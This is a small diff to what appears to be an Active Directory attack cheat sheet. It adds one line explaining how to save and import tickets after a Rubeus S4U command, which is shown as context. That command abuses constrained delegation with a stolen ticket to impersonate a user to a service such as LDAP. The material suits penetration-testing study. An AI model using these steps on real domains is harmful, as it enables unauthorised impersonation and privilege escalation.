@@ -744,6 +744,7 @@ Rubeus (optional ```/ptt``` ```/domain``` ```/dc```):
 Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
 
+You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP
 
 Example:
 
